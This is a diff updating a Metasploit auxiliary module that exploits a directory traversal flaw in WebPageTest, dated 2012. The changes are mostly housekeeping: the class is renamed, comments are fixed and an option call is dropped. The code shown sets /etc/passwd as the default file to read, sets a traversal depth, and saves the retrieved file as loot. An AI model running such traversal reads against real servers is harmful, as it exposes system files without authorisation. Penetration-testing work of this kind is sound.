@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
@@ -26,8 +23,8 @@ class Metasploit3 < Msf::Auxiliary
         ],
       'Author'         =>
         [
-          'dun',    #Discovery, PoC
-          'sinn3r'  #Metasploit
+          'dun',    # Discovery, PoC
+          'sinn3r'  # Metasploit module
         ],
       'License'        => MSF_LICENSE,
       'DisclosureDate' => "Jul 13 2012"
@@ -38,9 +35,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('TARGETURI', [true, 'The base path to WebPageTest', '/www/']),
         OptString.new('FILE', [ true,  "The path to the file to view", '/etc/passwd']),
         OptInt.new('DEPTH', [true, 'The max traversal depth', 11])
-      ], self.class)
-
-    deregister_options('RHOST')
+      ])
   end
 
 
@@ -72,5 +67,4 @@ class Metasploit3 < Msf::Auxiliary
     p = store_loot('webpagetest.traversal.file', 'application/octet-stream', ip, res.body, File.basename(file))
     print_good("File saved as: #{p}")
   end
-
 end
